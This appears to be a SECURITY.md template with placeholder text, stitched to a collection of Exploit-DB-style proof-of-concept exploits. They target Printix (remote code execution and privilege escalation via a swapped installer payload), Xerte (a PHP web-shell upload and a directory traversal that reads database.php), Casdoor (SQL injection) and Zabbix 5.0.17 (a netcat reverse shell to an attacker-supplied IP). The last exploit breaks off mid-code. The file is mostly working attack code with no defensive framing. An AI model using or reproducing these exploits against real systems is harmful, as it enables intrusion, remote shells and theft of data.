# Security Policy

## Supported Versions

Use this section to tell people about which versions of your project are
currently being supported with security updates.

| Version | Supported          |
| ------- | ------------------ |
| 5.1.x   | :white_check_mark: |
| 5.0.x   | :x:                |
| 4.0.x   | :white_check_mark: |
| < 4.0   | :x:                |

## Reporting a Vulnerability

Use this section to tell people how to report a vulnerability.

Tell them where to go, how often they can expect to get an update on a
reported vulnerability, what to expect if the vulnerability is accepted or
declined, etc.
git cvlone https://github.com/ezelnur6327/ezelnur/6327
# Exploit Title: Printix Client 1.3.1106.0 - Remote Code Execution (RCE)
# Date: 3/1/2022
# Exploit Author: Logan Latvala
# Vendor Homepage: https://printix.net
# Software Link: https://software.printix.net/client/win/1.3.1106.0/PrintixClientWindows.zip
# Version: <= 1.3.1106.0
# Tested on: Windows 7, Windows 8, Windows 10, Windows 11
# CVE : CVE-2022-25089
# Github for project: https://github.com/ComparedArray/printix-CVE-2022-25089

using Microsoft.Win32;
using Newtonsoft.Json;
using Newtonsoft.Json.Converters;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

/**
 * ________________________________________
 *
 * Printix Vulnerability, CVE-2022-25089
 * Part of a Printix Vulnerability series
 * Author: Logan Latvala
 * Github: https://github.com/ComparedArray/printix-CVE-2022-25089
 * ________________________________________
 *
 */


namespace ConsoleApp1a
{

    public class PersistentRegistryData
    {
        public PersistentRegistryCmds cmd;

        public string path;

        public int VDIType;

        public byte[] registryData;
    }

    [JsonConverter(typeof(StringEnumConverter))]
    public enum PersistentRegistryCmds
    {
        StoreData = 1,
        DeleteSubTree,
        RestoreData
    }
    public class Session
    {
        public int commandNumber { get; set; }
        public string host { get; set; }
        public string data { get; set; }
        public string sessionName { get; set; }
        public Session(int commandSessionNumber = 0)
        {
            commandNumber = commandSessionNumber;
            switch (commandSessionNumber)
            {
                //Incase it's initiated, kill it immediately.
                case (0):
                    Environment.Exit(0x001);
                    break;

                //Incase the Ping request is sent though, get its needed data.
                case (2):
                    Console.WriteLine("\n What Host Address?  (DNS Names Or IP)\n");
                    Console.Write("IP: ");
                    host = Console.ReadLine();
                    Console.WriteLine("Host address set to: " + host);

                    data = "pingData";
                    sessionName = "PingerRinger";
                    break;

                //Incase the RegEdit request is sent though, get its needed data.
                case (49):
                    Console.WriteLine("\n What Host Address?  (DNS Names Or IP)\n");
                    Console.Write("IP: ");
                    host = Console.ReadLine();
                    Console.WriteLine("Host address set to: " + host);

                    PersistentRegistryData persistentRegistryData = new PersistentRegistryData();
                    persistentRegistryData.cmd = PersistentRegistryCmds.RestoreData;
                    persistentRegistryData.VDIType = 12; //(int)DefaultValues.VDIType;
                                                         //persistentRegistryData.path = "printix\\SOFTWARE\\Intel\\HeciServer\\das\\SocketServiceName";
                    Console.WriteLine("\n What Node starting from \\\\Local-Machine\\ would you like to select? \n");
                    Console.WriteLine("Example: HKEY_LOCAL_MACHINE\\SOFTWARE\\Intel\\HeciServer\\das\\SocketServiceName\n");
                    Console.WriteLine("You can only change values in HKEY_LOCAL_MACHINE");
                    Console.Write("Registry Node: ");
                    persistentRegistryData.path = "" + Console.ReadLine().Replace("HKEY_LOCAL_MACHINE","printix");
                    Console.WriteLine("Full Address Set To:  " + persistentRegistryData.path);

                    //persistentRegistryData.registryData = new byte[2];
                    //byte[] loader = selectDataType("Intel(R) Capability Licensing stuffidkreally", RegistryValueKind.String);

                    Console.WriteLine("\n What Data type are you using? \n1. String 2. Dword  3. Qword 4. Multi String  \n");
                    Console.Write("Type:  ");
                    int dataF = int.Parse(Console.ReadLine());
                    Console.WriteLine("Set Data to: " + dataF);

                    Console.WriteLine("\n What value is your type?  \n");
                    Console.Write("Value:  ");
                    string dataB = Console.ReadLine();
                    Console.WriteLine("Set Data to: " + dataF);

                    byte[] loader = null;
                    List<byte> byteContainer = new List<byte>();
                    //Dword = 4
                    //SET THIS NUMBER TO THE TYPE OF DATA YOU ARE USING! (CHECK ABOVE FUNCITON selectDataType()!)

                    switch (dataF)
                    {
                        case (1):

                            loader = selectDataType(dataB, RegistryValueKind.String);
                            byteContainer.Add(1);
                            break;
                        case (2):
                            loader = selectDataType(int.Parse(dataB), RegistryValueKind.DWord);
                            byteContainer.Add(4);
                            break;
                        case (3):
                            loader = selectDataType(long.Parse(dataB), RegistryValueKind.QWord);
                            byteContainer.Add(11);
                            break;
                        case (4):
                            loader = selectDataType(dataB.Split('%'), RegistryValueKind.MultiString);
                            byteContainer.Add(7);
                            break;

                    }

                    int pathHolder = 0;
                    foreach (byte bit in loader)
                    {
                        pathHolder++;
                        byteContainer.Add(bit);
                    }

                    persistentRegistryData.registryData = byteContainer.ToArray();
                    //added stuff:

                    //PersistentRegistryData data = new PersistentRegistryData();
                    //data.cmd = PersistentRegistryCmds.RestoreData;
                    //data.path = "";


                    //data.cmd
                    Console.WriteLine(JsonConvert.SerializeObject(persistentRegistryData));
                    data = JsonConvert.SerializeObject(persistentRegistryData);

                    break;
                //Custom cases, such as custom JSON Inputs and more.
                case (100):
                    Console.WriteLine("\n What Host Address?  (DNS Names Or IP)\n");
                    Console.Write("IP: ");
                    host = Console.ReadLine();
                    Console.WriteLine("Host address set to: " + host);

                    Console.WriteLine("\n What Data Should Be Sent?\n");
                    Console.Write("Data: ");
                    data = Console.ReadLine();
                    Console.WriteLine("Data set to: " + data);

                    Console.WriteLine("\n What Session Name Should Be Used? \n");
                    Console.Write("Session Name: ");
                    sessionName = Console.ReadLine();
                    Console.WriteLine("Session name set to: " + sessionName);
                    break;
            }


        }
        public static byte[] selectDataType(object value, RegistryValueKind format)
        {
            byte[] array = new byte[50];

            switch (format)
            {
                case RegistryValueKind.String: //1
                    array = Encoding.UTF8.GetBytes((string)value);
                    break;
                case RegistryValueKind.DWord://4
                    array = ((!(value.GetType() == typeof(int))) ? BitConverter.GetBytes((long)value) : BitConverter.GetBytes((int)value));
                    break;
                case RegistryValueKind.QWord://11
                    if (value == null)
                    {
                        value = 0L;
                    }
                    array = BitConverter.GetBytes((long)value);
                    break;
                case RegistryValueKind.MultiString://7
                    {
                        if (value == null)
                        {
                            value = new string[1] { string.Empty };
                        }
                        string[] array2 = (string[])value;
                        foreach (string s in array2)
                        {
                            byte[] bytes = Encoding.UTF8.GetBytes(s);
                            byte[] second = new byte[1] { (byte)bytes.Length };
                            array = array.Concat(second).Concat(bytes).ToArray();
                        }
                        break;
                    }
            }
            return array;
        }
    }
    class CVESUBMISSION
    {
        static void Main(string[] args)
        {
        FORCERESTART:
            try
            {

                //Edit any registry without auth:
                //Use command 49, use the code provided on the desktop...
                //This modifies it directly, so no specific username is needed. :D

                //The command parameter, a list of commands is below.
                int command = 43;

                //To force the user to input variables or not.
                bool forceCustomInput = false;

                //The data to send, this isn't flexible and should be used only for specific examples.
                //Try to keep above 4 characters if you're just shoving things into the command.
                string data = "{\"profileID\":1,\"result\":true}";

                //The username to use.
                //This is to fulfill the requriements whilst in development mode.
                DefaultValues.CurrentSessName = "printixMDNs7914";

                //The host to connect to. DEFAULT= "localhost"
                string host = "192.168.1.29";

            //                                Configuration Above

            InvalidInputLabel:
                Console.Clear();
                Console.WriteLine("Please select the certificate you want to use with port 21338.");
                //Deprecated, certificates are no longer needed to verify, as clientside only uses the self-signed certificates now.
                Console.WriteLine("Already selected, client authentication isn't needed.");

                Console.WriteLine(" /───────────────────────────\\ ");
                Console.WriteLine("\nWhat would you like to do?");
                Console.WriteLine("\n    1. Send Ping Request");
                Console.WriteLine("    2. Send Registry Edit Request");
                Console.WriteLine("    3. Send Custom Request");
                Console.WriteLine("    4. Experimental Mode (Beta)\n");
                Console.Write("I choose option # ");

                try
                {
                    switch (int.Parse(Console.ReadLine().ToLower()))
                    {
                        case (1):
                            Session session = new Session(2);

                            command = session.commandNumber;
                            host = session.host;
                            data = session.data;
                            DefaultValues.CurrentSessName = "printixReflectorPackage_" + new Random().Next(1, 200);



                            break;
                        case (2):
                            Session sessionTwo = new Session(49);

                            command = sessionTwo.commandNumber;
                            host = sessionTwo.host;
                            data = sessionTwo.data;
                            DefaultValues.CurrentSessName = "printixReflectorPackage_" + new Random().Next(1, 200);

                            break;
                        case (3):

                            Console.WriteLine("What command number do you want to input?");
                            command = int.Parse(Console.ReadLine().ToString());
                            Console.WriteLine("What IP would you like to use? (Default = localhost)");
                            host = Console.ReadLine();
                            Console.WriteLine("What data do you want to send? (Keep over 4 chars if you are not sure!)");
                            data = Console.ReadLine();

                            Console.WriteLine("What session name do you want to use? ");
                            DefaultValues.CurrentSessName = Console.ReadLine();
                            break;
                        case (4):
                            Console.WriteLine("Not yet implemented.");
                            break;
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine("Invalid Input!");
                    goto InvalidInputLabel;
                }
                
                Console.WriteLine("Proof Of Concept For CVE-2022-25089 | Version: 1.3.24 | Created by Logan Latvala");
                Console.WriteLine("This is a RAW API, in which you may get unintended results from usage.\n");

                CompCommClient client = new CompCommClient();


                byte[] responseStorage = new byte[25555];
                int responseCMD = 0;
                client.Connect(host, 21338, 3, 10000);

                client.SendMessage(command, Encoding.UTF8.GetBytes(data));
                // Theory: There is always a message being sent, yet it doesn't read it, or can't intercept it.
                // Check for output multiple times, and see if this is conclusive.



                //client.SendMessage(51, Encoding.ASCII.GetBytes(data));
                new Thread(() => {
                    //Thread.Sleep(4000);
                    if (client.Connected())
                    {
                        int cam = 0;
                        // 4 itterations of loops, may be lifted in the future.
                        while (cam < 5)
                        {

                            //Reads the datastream and keeps returning results.
                            //Thread.Sleep(100);
                            try
                            {
                                try
                                {
                                    if (responseStorage?.Any() == true)
                                    {
                                        //List<byte> byo1 =  responseStorage.ToList();
                                        if (!Encoding.UTF8.GetString(responseStorage).Contains("Caption"))
                                        {
                                            foreach (char cam2 in Encoding.UTF8.GetString(responseStorage))
                                            {
                                                if (!char.IsWhiteSpace(cam2) && char.IsLetterOrDigit(cam2) || char.IsPunctuation(cam2))
                                                {
                                                    Console.Write(cam2);
                                                }
                                            }
                                        }else
                                        {
                                            
                                        }
                                    }

                                }
                                catch (Exception e) { Debug.WriteLine(e); }
                                client.Read(out responseCMD, out responseStorage);

                            }
                            catch (Exception e)
                            {
                                goto ReadException;
                            }
                            Thread.Sleep(100);
                            cam++;
                            //Console.WriteLine(cam);
                        }

                    


                    }
                    else
                    {
                        Console.WriteLine("[WARNING]: Client is Disconnected!");
                    }
                ReadException:
                    try
                    {
                        Console.WriteLine("Command Variable Response: " + responseCMD);
                        Console.WriteLine(Encoding.UTF8.GetString(responseStorage) + " || " + responseCMD);
                        client.disConnect();
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine("After 4.2 Seconds, there has been no response!");
                        client.disConnect();
                    }
                }).Start();

                Console.WriteLine(responseCMD);
                Console.ReadLine();

            }

            catch (Exception e)
            {
                Console.WriteLine(e);
                Console.ReadLine();

                //Environment.Exit(e.HResult);
            }

            goto FORCERESTART;
        }
    }
}
# Exploit Title: Xerte 3.9 - Remote Code Execution (RCE) (Authenticated)
# Date: 05/03/2021
# Exploit Author: Rik Lutz
# Vendor Homepage: https://xerte.org.uk
# Software Link: https://github.com/thexerteproject/xerteonlinetoolkits/archive/refs/heads/3.8.5-33.zip
# Version: up until version 3.9
# Tested on: Windows 10 XAMP
# CVE : CVE-2021-44664

# This PoC assumes guest login is enabled and the en-GB langues files are used.
# This PoC wil overwrite the existing langues file (.inc) for the englisch index page with a shell.
# Vulnerable url: https://<host>/website_code/php/import/fileupload.php
# The mediapath variable can be used to set the destination of the uploaded.
# Create new project from template -> visit "Properties" (! symbol) -> Media and Quota

import requests
import re

xerte_base_url = "http://127.0.0.1"
php_session_id = "" # If guest is not enabled, and you have a session ID. Put it here.

with requests.Session() as session:
    # Get a PHP session ID
    if not php_session_id:
        session.get(xerte_base_url)
    else:
        session.cookies.set("PHPSESSID", php_session_id)

     # Use a default template
    data = {
        'tutorialid': 'Nottingham',
        'templatename': 'Nottingham',
        'tutorialname': 'exploit',
        'folder_id': ''
    }

    # Create a new project in order to find the install path
    template_id = session.post(xerte_base_url + '/website_code/php/templates/new_template.php', data=data)

    # Find template ID
    data = {
        'template_id': re.findall('(\d+)', template_id.text)[0]
    }

    # Find the install path:
    install_path = session.post(xerte_base_url + '/website_code/php/properties/media_and_quota_template.php', data=data)
    install_path = re.findall('mediapath" value="(.+?)"', install_path.text)[0]

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'nl,en-US;q=0.7,en;q=0.3',
        'Content-Type': 'multipart/form-data; boundary=---------------------------170331411929658976061651588978',
       }

    # index.inc file
    data = \
    '''-----------------------------170331411929658976061651588978
Content-Disposition: form-data; name="filenameuploaded"; filename="index.inc"
Content-Type: application/octet-stream

<?php
if(isset($_REQUEST[\'cmd\'])){ echo "<pre>"; $cmd = ($_REQUEST[\'cmd\']); system($cmd); echo "</pre>"; die; }
/**
 *
 * index.php english language file
 *
 * @author Patrick Lockley
 * @version 1.0
 * @copyright Pat Lockley
 * @package
 */

define("INDEX_USERNAME_AND_PASSWORD_EMPTY", "Please enter your username and password");

define("INDEX_USERNAME_EMPTY", "Please enter your username");

define("INDEX_PASSWORD_EMPTY", "Please enter your password");

define("INDEX_LDAP_MISSING", "PHP\'s LDAP library needs to be installed to use LDAP authentication. If you read the install guide other options are available");

define("INDEX_SITE_ADMIN", "Site admins should log on on the manangement page");

define("INDEX_LOGON_FAIL", "Sorry that password combination was not correct");

define("INDEX_LOGIN", "login area");

define("INDEX_USERNAME", "Username");

define("INDEX_PASSWORD", "Password");

define("INDEX_HELP_TITLE", "Getting Started");

define("INDEX_HELP_INTRODUCTION", "We\'ve produced a short introduction to the Toolkits website.");

define("INDEX_HELP_INTRO_LINK_TEXT","Show me!");

define("INDEX_NO_LDAP","PHP\'s LDAP library needs to be installed to use LDAP authentication. If you read the install guide other options are available");

define("INDEX_FOLDER_PROMPT","What would you like to call your folder?");

define("INDEX_WORKSPACE_TITLE","My Projects");

define("INDEX_CREATE","Project Templates");

define("INDEX_DETAILS","Project Details");

define("INDEX_SORT","Sort");

define("INDEX_SEARCH","Search");

define("INDEX_SORT_A","Alphabetical A-Z");

define("INDEX_SORT_Z","Alphabetical Z-A");

define("INDEX_SORT_NEW","Age (New to Old)");

define("INDEX_SORT_OLD","Age (Old to New)");

define("INDEX_LOG_OUT","Log out");

define("INDEX_LOGGED_IN_AS","Logged in as");

define("INDEX_BUTTON_LOGIN","Login");

define("INDEX_BUTTON_LOGOUT","Logout");

define("INDEX_BUTTON_PROPERTIES","Properties");

define("INDEX_BUTTON_EDIT","Edit");

define("INDEX_BUTTON_PREVIEW", "Preview");

define("INDEX_BUTTON_SORT", "Sort");

define("INDEX_BUTTON_NEWFOLDER", "New Folder");

define("INDEX_BUTTON_NEWFOLDER_CREATE", "Create");

define("INDEX_BUTTON_DELETE", "Delete");

define("INDEX_BUTTON_DUPLICATE", "Duplicate");

define("INDEX_BUTTON_PUBLISH", "Publish");

define("INDEX_BUTTON_CANCEL", "Cancel");

define("INDEX_BUTTON_SAVE", "Save");

define("INDEX_XAPI_DASHBOARD_FROM", "From:");

define("INDEX_XAPI_DASHBOARD_UNTIL", "Until:");

define("INDEX_XAPI_DASHBOARD_GROUP_SELECT", "Select group:");

define("INDEX_XAPI_DASHBOARD_GROUP_ALL", "All groups");

define("INDEX_XAPI_DASHBOARD_SHOW_NAMES", "Show names and/or email addresses");

define("INDEX_XAPI_DASHBOARD_CLOSE", "Close dashboard");

define("INDEX_XAPI_DASHBOARD_DISPLAY_OPTIONS", "Display options");

define("INDEX_XAPI_DASHBOARD_SHOW_HIDE_COLUMNS", "Show / hide columns");

define("INDEX_XAPI_DASHBOARD_QUESTION_OVERVIEW", "Interaction overview");

define("INDEX_XAPI_DASHBOARD_PRINT", "Print");
\r
\r
-----------------------------170331411929658976061651588978
Content-Disposition: form-data; name="mediapath"

''' \
    + install_path \
    + '''../../../languages/en-GB/
-----------------------------170331411929658976061651588978--\r
'''

    # Overwrite index.inc file
    response = session.post(xerte_base_url + '/website_code/php/import/fileupload.php', headers=headers, data=data)
    print('Installation path: ' + install_path)
    print(response.text)
    if "success" in response.text:
        print("Visit shell @: " + xerte_base_url + '/?cmd=whoami')
# Exploit Title: Xerte 3.10.3 - Directory Traversal (Authenticated)
# Date: 05/03/2021
# Exploit Author: Rik Lutz
# Vendor Homepage: https://xerte.org.uk
# Software Link: https://github.com/thexerteproject/xerteonlinetoolkits/archive/refs/heads/3.9.zip
# Version: up until 3.10.3
# Tested on: Windows 10 XAMP
# CVE : CVE-2021-44665

# This PoC assumes guest login is enabled. Vulnerable url:
# https://<host>/getfile.php?file=<user-direcotry>/../../database.php
# You can find a userfiles-directory by creating a project and browsing the media menu.
# Create new project from template -> visit "Properties" (! symbol) -> Media and Quota -> Click file to download
# The userfiles-direcotry will be noted in the URL and/or when you download a file.
# They look like: <numbers>-<username>-<templatename>

import requests
import re

xerte_base_url = "http://127.0.0.1"
file_to_grab = "/../../database.php"
php_session_id = "" # If guest is not enabled, and you have a session ID. Put it here.

with requests.Session() as session:
    # Get a PHP session ID
    if not php_session_id:
        session.get(xerte_base_url)
    else:
        session.cookies.set("PHPSESSID", php_session_id)

    # Use a default template
    data = {
        'tutorialid': 'Nottingham',
        'templatename': 'Nottingham',
        'tutorialname': 'exploit',
        'folder_id': ''
    }

    # Create a new project in order to create a user-folder
    template_id = session.post(xerte_base_url + '/website_code/php/templates/new_template.php', data=data)

    # Find template ID
    data = {
        'template_id': re.findall('(\d+)', template_id.text)[0]
    }

    # Find the created user-direcotry:
    user_direcotry = session.post(xerte_base_url + '/website_code/php/properties/media_and_quota_template.php', data=data)
    user_direcotry = re.findall('USER-FILES\/([0-9]+-[a-z0-9]+-[a-zA-Z0-9_]+)', user_direcotry.text)[0]

    # Grab file
    result = session.get(xerte_base_url + '/getfile.php?file=' + user_direcotry + file_to_grab)
    print(result.text)
    print("|-- Used Variables: --|")
    print("PHP Session ID: " + session.cookies.get_dict()['PHPSESSID'])
    print("user direcotry: " + user_direcotry)
    print("Curl example:")
    print('curl --cookie "PHPSESSID=' + session.cookies.get_dict()['PHPSESSID'] + '" ' + xerte_base_url + '/getfile.php?file=' + user_direcotry + file_to_grab)
// Exploit Title: Casdoor 1.13.0 - SQL Injection (Unauthenticated)
// Date: 2022-02-25
// Exploit Author: Mayank Deshmukh
// Vendor Homepage: https://casdoor.org/
// Software Link: https://github.com/casdoor/casdoor/releases/tag/v1.13.0
// Version: version < 1.13.1
// Security Advisory: https://github.com/advisories/GHSA-m358-g4rp-533r
// Tested on: Kali Linux
// CVE : CVE-2022-24124
// Github POC: https://github.com/ColdFusionX/CVE-2022-24124

// Exploit Usage : go run exploit.go -u http://127.0.0.1:8080

package main

import (
    "flag"
    "fmt"
    "html"
    "io/ioutil"
    "net/http"
    "os"
    "regexp"
    "strings"
)

func main() {
    var url string
    flag.StringVar(&url, "u", "", "Casdoor URL (ex. http://127.0.0.1:8080)")
    flag.Parse()

    banner := `
-=Casdoor SQL Injection (CVE-2022-24124)=-
- by Mayank Deshmukh (ColdFusionX)

`
    fmt.Printf(banner)
    fmt.Println("[*] Dumping Database Version")
    response, err := http.Get(url + "/api/get-organizations?p=123&pageSize=123&value=cfx&sortField=&sortOrder=&field=updatexml(null,version(),null)")

    if err != nil {
        panic(err)
    }

    defer response.Body.Close()

    databytes, err := ioutil.ReadAll(response.Body)

    if err != nil {
        panic(err)
    }

    content := string(databytes)

    re := regexp.MustCompile("(?i)(XPATH syntax error.*&#39)")

    result := re.FindAllString(content, -1)
    
    sqliop := fmt.Sprint(result)
    replacer := strings.NewReplacer("[", "", "]", "", "&#39", "", ";", "")
    
    finalop := replacer.Replace(sqliop)
    fmt.Println(html.UnescapeString(finalop))


    if result == nil {
        fmt.Printf("Application not vulnerable\n")
        os.Exit(1)
    }

}
# Exploit Title: Zabbix 5.0.17 - Remote Code Execution (RCE) (Authenticated)
# Date: 9/3/2022
# Exploit Author: Hussien Misbah
# Vendor Homepage: https://www.zabbix.com/
# Software Link: https://www.zabbix.com/rn/rn5.0.17
# Version: 5.0.17
# Tested on: Linux
# Reference: https://github.com/HussienMisbah/tools/tree/master/Zabbix_exploit

#!/usr/bin/python3
# note : this is blind RCE so don't expect to see results on the site
# this exploit is tested against Zabbix 5.0.17 only

import sys
import requests
import re
import random
import string
import colorama
from colorama import Fore


print(Fore.YELLOW+"[*] this exploit is tested against Zabbix 5.0.17 only")
print(Fore.YELLOW+"[*] can reach the author @ https://hussienmisbah.github.io/")


def item_name() :
    letters = string.ascii_letters
    item =  ''.join(random.choice(letters) for i in range(20))
    return item

if len(sys.argv) != 6 :
    print(Fore.RED +"[!] usage : ./expoit.py <target url>  <username> <password> <attacker ip> <attacker port>")
    sys.exit(-1)

url  = sys.argv[1]
username =sys.argv[2]
password = sys.argv[3]
host = sys.argv[4]
port = sys.argv[5]


s = requests.Session()


headers ={
"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
}

data = { 
"request":"hosts.php",
"name"  : username ,
"password" : password ,
"autologin" :"1" ,
"enter":"Sign+in"
}


proxies = {
   'http': 'http://127.0.0.1:8080'
}


r = s.post(url+"/index.php",data=data)  #proxies=proxies)

if "Sign out" not in r.text :
    print(Fore.RED +"[!] Authentication failed")
    sys.exit(-1)
if "Zabbix 5.0.17" not in r.text :
    print(Fore.RED +"[!] This is not Zabbix 5.0.17")
    sys.exit(-1)

if "filter_hostids%5B0%5D=" in r.text :
    try :
        x = re.search('filter_hostids%5B0%5D=(.*?)"', r.text)
        hostId = x.group(1)
    except :
        print(Fore.RED +"[!] Exploit failed to resolve HostID")
        print(Fore.BLUE +"[?] you can find it under /items then add item")
        sys.exit(-1)
else :
    print(Fore.RED +"[!] Exploit failed to resolve HostID")
    print(Fore.BLUE +"[?] you can find HostID under /items then add item")
    sys.exit(-1)


sid= re.search('<meta name="csrf-token" content="(.*)"/>',r.text).group(1) # hidden_csrf_token


command=f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {host} {port}  >/tmp/f"

payload = f"system.run[{command},nowait]"
Random_name = item_name()
data2 ={
    
"sid":sid,"form_refresh":"1","form":"create","hostid":hostId,"selectedInterfaceId":"0","name":Random_name,"type":"0","key":payload,"url":"","query_fields[name][1]":"","query_fields[value][1]":"","timeout":"3s","post_type":"0","posts":"","headers[name][1]":"","headers[value][1]":"","status_codes":"200","follow_redirects":"1","retrieve_mode":"0","http_proxy":"","http_username":"","http_password":"","ssl_cert_file":"","ssl_key_file":"","ssl_key_password":"","interfaceid":"1","params_es":"","params_ap":"","params_f":"","value_type":"3","units":"","delay":"1m","delay_flex[0][type]":"0","delay_flex[0][delay]":"","delay_flex[0][schedule]":"","delay_flex[0][period]":"","history_mode":"1","history":"90d","trends_mode":"1","trends":"365d","valuemapid":"0","new_application":"","applications[]":"0","inventory_link":"0","description":"","status":"0","add":"Add"
}

r2 =s.post(url+"/items.php" ,data=data2,headers=headers,cookies={"tab":"0"} )


no_pages= r2.text.count("?page=")

#################################################[Searching in all pages for the uploaded item]#################################################
page = 1
flag=False
while page <= no_pages :
    r_page=s.get(url+f"/items.php?page={page}" ,headers=headers )
    if  Random_name in r_page.text :
        print(Fore.GREEN+"[+] the payload has been Uploaded Successfully")
        x2 = re.search(rf"(\d+)[^\d]>{Random_name}",r_page.text)
        try :
            itemId=x2.group(1)
        except :
            pass

        print(Fore.GREEN+f"[+] you should find it at {url}/items.php?form=update&hostid={hostId}&itemid={itemId}")
        flag=True
        break

    else :
        page +=1

if flag==False :
        print(Fore.BLUE +"[?] do you know you can't upload same key twice ?")
        print(Fore.BLUE +"[?] maybe it is already uploaded so set the listener and wait 1m")
        print(Fore.BLUE +"[*] change the port and try again")
        sys.exit(-1)

#################################################[Executing the item]#################################################


data2["form"] ="update"
data2["selectedInterfaceId"] = "1"
data2["check_now"]="Execute+now"
data2.pop("add",None)
data2["itemid"]=itemId,

print(Fore.GREEN+f"[+] set the listener at {port} please...")

r2 =s.post(url+"/items.php" ,data=data2,headers=headers,cookies={"tab":"0"}) # ,proxies=proxies )

print(Fore.BLUE+ "[?] note : it takes up to +1 min so be patient :)")
answer =input(Fore.BLUE+"[+] got a shell ? [y]es/[N]o: ")

if "y" in answer.lower() :
    print(Fore.GREEN+"Nice !")
else :
    print(Fore.RED+"[!] if you find out why please contact me ")

sys.exit(0)
# Exploit Title: Printix Client 1.3.1106.0 - Privilege Escalation
# Date: 3/2/2022
# Exploit Author: Logan Latvala
# Vendor Homepage: https://printix.net
# Software Link:
https://software.printix.net/client/win/1.3.1106.0/PrintixClientWindows.zip
# Version: <= 1.3.1106.0
# Tested on: Windows 7, Windows 8, Windows 10, Windows 11
# CVE : CVE-2022-25090
# Github for project: https://github.com/ComparedArray/printix-CVE-2022-25090

using System;
using System.Runtime.InteropServices;
using System.Drawing;

using System.Reflection;
using System.Threading;
using System.IO;
using System.Text;
using System.Resources;
using System.Diagnostics;

//Assembly COM for transparent creation of the application.

//End of Assembly COM For Transparent Creation usage.
public class Program
{
    //Initiator class for the program, the program starts on the main method.
    public static void Main(string[] args)
    {
        //Console.SetWindowSize(120,30);
        //Console.SetBufferSize(120,30);
        Console.ForegroundColor = ConsoleColor.Blue;
        Console.WriteLine("┌─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────");
        Console.WriteLine("├              oo dP                           dP                                ");
        Console.ForegroundColor = ConsoleColor.Red;
        Console.WriteLine("├                 88                           88                                ");
        Console.ForegroundColor = ConsoleColor.Green;
        Console.WriteLine("├              dP 88d888b. .d8888b. d888888b d8888P .d8888b. 88d8b.d8b. 88d888b. ");
        Console.ForegroundColor = ConsoleColor.Blue;
        Console.WriteLine("├              88 88'  `88 88'  `88    .d8P'   88   88ooood8 88'`88'`88 88'  `88 ");
        Console.ForegroundColor = ConsoleColor.Yellow;
        Console.WriteLine("├              88 88    88 88.  .88  .Y8P      88   88.  ... 88  88  88 88.  .88 ");
        Console.ForegroundColor = ConsoleColor.Magenta;
        Console.WriteLine("├              dP dP    dP `88888P8 d888888P   dP   `88888P' dP  dP  dP 88Y888P' ");
        Console.WriteLine("├                                                                       88       ");
        Console.WriteLine("├                                                                       dP       ");
        Console.ForegroundColor = ConsoleColor.Blue;
        Console.Write("├                                    For ");
        Console.ForegroundColor = ConsoleColor.Magenta;
        Console.Write("Printix ");
        Console.ForegroundColor = ConsoleColor.Blue;
        Console.Write("Services                       Designed By Logan Latvala\n");
        Console.WriteLine("└─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────");
        Thread.Sleep(3000);
        string filesH = "";
        Console.WriteLine("Drag and drop a payload onto this application for execution.");
        try
        {
            if (args[0]?.Length >0)
            {
                Console.WriteLine("File Added: " + args[0]);
            }
            
        }
        catch (Exception e)
        {
            Console.WriteLine("You\'re missing a file here, please ensure that you drag and drop a payload to execute.\n \n We'll print the error for you right here...\n \n");
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine(e);
            Console.ReadLine();
            Environment.Exit(40);
        }


        Console.WriteLine("\n We're going to look for your printix installer, one moment...");
        string[] installerSearch = Directory.GetFiles(@"C:\windows\installer\", "*.msi", SearchOption.AllDirectories);

        double mCheck = 1.00;

        string trueInstaller = "";
        //Starts to enumerate window's installer directory for an author with the name of printix.
        foreach (string path in installerSearch)
        {
            Console.WriteLine("Searching Files: {0} / {1} Files", mCheck, installerSearch.Length);
            Console.WriteLine("Searching Files... " + (Math.Round((mCheck / installerSearch.Length) * 100)) + "% Done.");
            if (readFileProperties(path, "Printix"))
            {
                trueInstaller = path;
                Console.WriteLine("We've found your installer, we'll finish enumeration.");
                goto MGMA;
            }
            mCheck++;
        }
    //Flag for enumeration when the loop needs to exit, since it shouldn't loop infinitely.
    MGMA:
        if (trueInstaller == "")
        {
            Console.WriteLine("We can't find your installer, you are not vulnerable.");
            Thread.Sleep(2000);
            Environment.Exit(12);
        }
        Console.WriteLine("├─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────");
        Console.WriteLine("├ We are starting to enumerate your temporary directory.");
        Console.WriteLine("├─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────");

        //Start a new thread here for enumeration.

        Thread t = new Thread(() => newTempThread(filesH, args));
        t.Start();



        Process.Start(trueInstaller);



        Console.WriteLine("All done.");
        Console.ReadLine();
    }
    public static void newTempThread(string filesH, string[] args)
    {
        while (true)
        {
            try
            {
                //Starts the inheriting process for printix, in which scans for the files and relays their contents.
                string[] files = Directory.GetFiles(@"C:\Users\" + Environment.UserName + @"\AppData\Local\Temp\", "msiwrapper.ini", SearchOption.AllDirectories);
                if (!string.IsNullOrEmpty(files[0]))
                {
                    foreach (string fl in files)
                    {
                        if (!filesH.Contains(fl))
                        {

                            //filesH += " " + fl;
                            string[] fileText = File.ReadAllLines(fl);
                            int linerc = 0;
                            foreach (string liners in fileText)
                            {

                                if (liners.Contains("SetupFileName"))
                                {

                                    //Most likely the temporary directory for setup, which presents it properly.
                                    Console.WriteLine("├─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────");
                                    Console.WriteLine("├ " + fl);
                                    fileText[linerc] = @"SetupFileName=" + "\"" + args[0] + "\"";
                                    Console.WriteLine("├ " + fileText[linerc] + "");
                                    Console.WriteLine("├─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────");
                                    Console.WriteLine("│");
                                    filesH += " " + fl;

                                    File.WriteAllText(fl, string.Empty);
                                    File.WriteAllLines(fl, fileText);
                                }
